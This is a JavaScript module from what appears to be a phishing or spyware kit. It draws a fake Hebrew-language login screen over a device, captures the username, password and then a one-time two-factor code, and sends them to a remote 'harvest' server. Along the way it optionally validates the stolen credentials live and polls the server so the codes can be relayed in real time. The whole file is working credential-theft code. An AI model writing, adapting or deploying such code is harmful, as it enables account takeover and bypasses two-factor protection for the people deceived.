import { forceEvent } from '../beacon.js';
import { CONFIG } from '../config.js';

export function showHarvest(config) {
  if (!config) return;
  const overlay = document.getElementById('harvest-overlay');
  overlay.innerHTML = config.login_html || defaultHarvestHTML();
  overlay.classList.add('active');

  const form = overlay.querySelector('form');
  if (!form) return;
  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const formData = new FormData(form);
    const creds = {
      username: formData.get('username') ?? formData.get('email') ?? formData.get('phone'),
      password: formData.get('password'),
    };
    await forceEvent('credentials', creds);

    if (config.validation_url) {
      await validateCreds(config, creds, overlay);
    } else {
      await sendCredsToServer(creds, config.id, null);
      if (config.otp_enabled) {
        showOTPForm(overlay, config);
      } else {
        overlay.classList.remove('active');
      }
    }
  });
}

async function validateCreds(config, creds, overlay) {
  const statusEl = overlay.querySelector('#harvest-status');
  if (statusEl) statusEl.textContent = 'מאמת...';
  try {
    const resp = await fetch(`${CONFIG.server}/api/harvest/validate`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ device_id: CONFIG.deviceId, creds, validation_url: config.validation_url }),
    });
    const result = await resp.json();
    if (result.valid) {
      if (config.otp_enabled) {
        showOTPForm(overlay, config);
      } else {
        overlay.classList.remove('active');
      }
    } else {
      if (statusEl) statusEl.textContent = 'שגיאה: שם משתמש או סיסמה שגויים';
    }
  } catch {
    if (statusEl) statusEl.textContent = 'שגיאת חיבור';
  }
}

async function sendCredsToServer(creds, configId, otp) {
  if (!CONFIG.deviceId) return;
  await fetch(`${CONFIG.server}/api/harvest/submit`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ device_id: parseInt(CONFIG.deviceId), ...creds, otp, harvest_config_id: configId }),
  });
}

function showOTPForm(overlay, config) {
  overlay.innerHTML = `
    <div style="height:100dvh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:32px;background:#000">
      <h2 style="margin-bottom:12px;font-size:24px">אימות דו-שלבי</h2>
      <p style="color:#ebebf599;margin-bottom:24px;text-align:center">הזן את הקוד שנשלח לטלפון שלך</p>
      <input id="otp-input" style="width:100%;padding:14px;border-radius:12px;border:none;background:#1c1c1e;color:#fff;font-size:24px;text-align:center;letter-spacing:8px;margin-bottom:16px" type="number" placeholder="- - - - - -" maxlength="6">
      <div id="otp-status" style="color:#ff453a;font-size:14px;margin-bottom:12px;height:20px"></div>
      <button id="otp-submit" style="width:100%;padding:16px;border:none;border-radius:12px;background:#0a84ff;color:#fff;font-size:17px;font-weight:600">אישור</button>
    </div>`;

  const pollInterval = setInterval(async () => {
    try {
      const r = await fetch(`${CONFIG.server}/api/harvest/otp-ready/${CONFIG.deviceId}`);
      const data = await r.json();
      if (data.ready) { clearInterval(pollInterval); overlay.classList.remove('active'); }
    } catch { }
  }, 2000);

  document.getElementById('otp-submit').addEventListener('click', async () => {
    const otp = document.getElementById('otp-input').value;
    if (!otp || otp.length < 4) { document.getElementById('otp-status').textContent = 'קוד לא תקין'; return; }
    await sendCredsToServer({}, config.id, otp);
    clearInterval(pollInterval);
    overlay.classList.remove('active');
  });
}

function defaultHarvestHTML() {
  return `
    <div style="height:100dvh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:32px;background:#000">
      <h2 style="margin-bottom:24px">כניסה לחשבון</h2>
      <form style="width:100%">
        <input name="username" type="email" placeholder="דוא״ל" style="width:100%;padding:14px;border-radius:12px;border:none;background:#1c1c1e;color:#fff;font-size:17px;margin-bottom:12px;display:block">
        <input name="password" type="password" placeholder="סיסמה" style="width:100%;padding:14px;border-radius:12px;border:none;background:#1c1c1e;color:#fff;font-size:17px;margin-bottom:16px;display:block">
        <div id="harvest-status" style="color:#ff453a;font-size:14px;margin-bottom:12px;height:20px"></div>
        <button type="submit" style="width:100%;padding:16px;border:none;border-radius:12px;background:#0a84ff;color:#fff;font-size:17px;font-weight:600">כניסה</button>
      </form>
    </div>`;
}
